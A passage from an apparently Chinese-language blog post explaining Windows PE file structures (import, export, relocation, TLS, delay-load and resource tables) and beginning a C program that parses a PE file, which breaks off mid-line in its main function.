class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 目录顺序</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT          0   <span class="comment">// Export Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT          1   <span class="comment">// Import Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE        2   <span class="comment">// Resource Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   <span class="comment">// Exception Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY        4   <span class="comment">// Security Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC       5   <span class="comment">// Base Relocation Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG           6   <span class="comment">// Debug Directory</span></span></span><br><span class="line"><span class="comment">//      IMAGE_DIRECTORY_ENTRY_COPYRIGHT       7   // (X86 usage)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   <span class="comment">// Architecture Specific Data，保留字段，必须为0</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   <span class="comment">// RVA of GP</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS             9   <span class="comment">// TLS Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   <span class="comment">// Load Configuration Directory</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   <span class="comment">// Bound Import Directory in headers</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12   <span class="comment">// Import Address Table</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   <span class="comment">// Delay Load Import Descriptors</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   <span class="comment">// COM Runtime descriptor</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// 即INT的RVA</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;      <span class="comment">// 动态链接库的名称(kernel32.dll)的RVA</span></span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// 即IAT的RVA</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE </span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;</span><br><span class="line">        DWORD AddressOfData;        <span class="comment">// PIMAGE_IMPORT_BY_NAME，指向IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 *PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;<span class="comment">// 需要导入函数的函数序号</span></span><br><span class="line">    CHAR   Name[<span class="number">1</span>];<span class="comment">// 需要导入函数的函数名</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><h2 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;<span class="comment">// 保留段，一直为0</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">// 创建时间</span></span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;<span class="comment">// 指向模块名的RVA</span></span><br><span class="line">    DWORD   Base;<span class="comment">// 输出API函数的索引值的基数(1)</span></span><br><span class="line">    DWORD   NumberOfFunctions;<span class="comment">// 导出函数个数</span></span><br><span class="line">    DWORD   NumberOfNames;<span class="comment">// 导出函数名个数，很多函数没有函数名</span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>主要用于动态链接库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_BASE_RELOCATION</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">// 需要重定位的RVA，一般为0x1000的倍数</span></span><br><span class="line">    DWORD   SizeOfBlock;<span class="comment">// 结构体和数组TypeOffset的体积总和 </span></span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TYPE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">WORD Offset  :  <span class="number">12</span>;</span><br><span class="line">WORD Type : <span class="number">4</span>;<span class="comment">// 4bit</span></span><br><span class="line">&#125;TYPE, *PTYPE;</span><br></pre></td></tr></table></figure><h2 id="TLS表"><a href="#TLS表" class="headerlink" title="TLS表"></a>TLS表</h2><p><img src="https://s1.ax1x.com/2023/07/24/pCLqa1e.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_TLS_DIRECTORY32</span> &#123;</span></span><br><span class="line">    DWORD   StartAddressOfRawData;<span class="comment">// 内存起始地址</span></span><br><span class="line">    DWORD   EndAddressOfRawData;<span class="comment">// 内存结束地址</span></span><br><span class="line">    DWORD   AddressOfIndex;             <span class="comment">// TLS的索引</span></span><br><span class="line">    DWORD   AddressOfCallBacks;         <span class="comment">// PIMAGE_TLS_CALLBACK *，回调函数的一个数组</span></span><br><span class="line">    DWORD   SizeOfZeroFill;<span class="comment">// 零填充区域的长度</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD Characteristics;<span class="comment">// 保留字段</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD Reserved0 : <span class="number">20</span>;</span><br><span class="line">            DWORD Alignment : <span class="number">4</span>;</span><br><span class="line">            DWORD Reserved1 : <span class="number">8</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_TLS_DIRECTORY32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_TLS_DIRECTORY32 * PIMAGE_TLS_DIRECTORY32;</span><br></pre></td></tr></table></figure><h2 id="延迟导入表"><a href="#延迟导入表" class="headerlink" title="延迟导入表"></a>延迟导入表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DELAYLOAD_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD AllAttributes;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD RvaBased : <span class="number">1</span>;             <span class="comment">// Delay load version 2</span></span><br><span class="line">            DWORD ReservedAttributes : <span class="number">31</span>;</span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">    &#125; Attributes;<span class="comment">// 属性</span></span><br><span class="line"></span><br><span class="line">    DWORD DllNameRVA;                       <span class="comment">// 动态链接库名称的RVA</span></span><br><span class="line">    DWORD ModuleHandleRVA;                  <span class="comment">// 模块句柄的RVA</span></span><br><span class="line">    DWORD ImportAddressTableRVA;            <span class="comment">// IAT的RVA</span></span><br><span class="line">    DWORD ImportNameTableRVA;               <span class="comment">// INT的RVA</span></span><br><span class="line">    DWORD BoundImportAddressTableRVA;       <span class="comment">// RVA to an optional bound IAT</span></span><br><span class="line">    DWORD UnloadInformationTableRVA;        <span class="comment">// RVA to an optional unload info table</span></span><br><span class="line">    DWORD TimeDateStamp;                    <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// Otherwise, date/time of the target DLL</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_DELAYLOAD_DESCRIPTOR, *PIMAGE_DELAYLOAD_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">const</span> IMAGE_DELAYLOAD_DESCRIPTOR *PCIMAGE_DELAYLOAD_DESCRIPTOR;</span><br></pre></td></tr></table></figure><h2 id="资源表"><a href="#资源表" class="headerlink" title="资源表"></a>资源表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;<span class="comment">// 00000000</span></span><br><span class="line">    DWORD   TimeDateStamp;<span class="comment">// 资源创建时间</span></span><br><span class="line">    WORD    MajorVersion;<span class="comment">// 4</span></span><br><span class="line">    WORD    MinorVersion;<span class="comment">// 0</span></span><br><span class="line">    WORD    NumberOfNamedEntries;<span class="comment">// 以字符串作为资源标识的条目的个数</span></span><br><span class="line">    WORD    NumberOfIdEntries;<span class="comment">// 以数字作为资源标识的条目的个数</span></span><br><span class="line"><span class="comment">//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/07/24/pCLqwXd.png" alt=""></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD NameOffset:<span class="number">31</span>;<span class="comment">// 资源表的偏移</span></span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;<span class="comment">// 资源为字符串，值为1表示资源为字符串-&gt;开发者的资源，不为1表示是系统资源</span></span><br><span class="line">        &#125; DUMMYSTRUCTNAME;</span><br><span class="line">        DWORD   Name;<span class="comment">// 资源的类型即资源名</span></span><br><span class="line">        WORD    Id;<span class="comment">// 资源的数字ID</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   OffsetToData;<span class="comment">// 数据偏移的地址</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;<span class="comment">// 子目录偏移的地址</span></span><br><span class="line">            DWORD   DataIsDirectory:<span class="number">1</span>;<span class="comment">// 数据是目录，值为1表示数据是目录</span></span><br><span class="line">        &#125; DUMMYSTRUCTNAME2;</span><br><span class="line">    &#125; DUMMYUNIONNAME2;</span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIR_STRING_U</span> &#123;</span></span><br><span class="line">    WORD    Length;<span class="comment">// 字符串长度</span></span><br><span class="line">    WCHAR   NameString[ <span class="number">1</span> ];<span class="comment">// 字符串数组</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIR_STRING_U, *PIMAGE_RESOURCE_DIR_STRING_U;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DATA_ENTRY</span> &#123;</span></span><br><span class="line">    DWORD   OffsetToData;<span class="comment">// 资源数据的RVA</span></span><br><span class="line">    DWORD   Size;<span class="comment">// 资源数据的长度</span></span><br><span class="line">    DWORD   CodePage;<span class="comment">// 代码页</span></span><br><span class="line">    DWORD   Reserved;<span class="comment">// 保留字段</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 资源总数 = NumberOfNamedEntries + NumberOfIdEntries</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    WORD    NumberOfNamedEntries;</span><br><span class="line">    WORD    NumberOfIdEntries;</span><br><span class="line"><span class="comment">//  IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[];</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;</span><br></pre></td></tr></table></figure><h2 id="PE文件解析代码"><a href="#PE文件解析代码" class="headerlink" title="PE文件解析代码"></a>PE文件解析代码</h2><h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算数据目录表起始位置到文件头(MZ)的偏移</span></span><br><span class="line">DWORD <span class="title function_">RvaToOffset</span><span class="params">(DWORD dwRva, <span class="type">char</span> *buffer)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析导入表的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ImportTbale</span><span class="params">(<span class="type">char</span> *buffer)</span>;</span><br><span class="line"><span class="comment">// 解析导出表的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ExportTable</span><span class="params">(<span class="type">char</span> *buffer)</span>;</span><br><span class="line"><span class="comment">// 解析重定位表的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">RelocTable</span><span class="params">(<span class="type">char</span> *buffer)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析TLS的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">TLSTable</span><span class="params">(<span class="type">char</span> *buffer)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解析延迟导入表的函数</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DelayImport</span><span class="params">(<span class="type">char</span> *buffer)</span>;</span><br></pre></td></tr></table></figure><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Entry.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">FILE *pFile = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">errno_t</span> err;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"><span class="type">int</span> nFileLength = <span class="number">0</span>;</span><br><span class="line">err = fopen_s(&amp;pFile, <span class="string">&quot;D:\\desktop\\PEiD.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>);<span class="comment">// 二进制形式读取PE文件,注意反斜杠前面需要再加一个反斜杠进行转义</span></span><br><span class="line">fseek(pFile, <span class="number">0</span>, SEEK_END);</span><br><span class="line">nFileLength = ftell(pFile);</span><br><span class="line">rewind(pFile);</span><br><span class="line"><span class="type">int</span> imageLength = nFileLength * 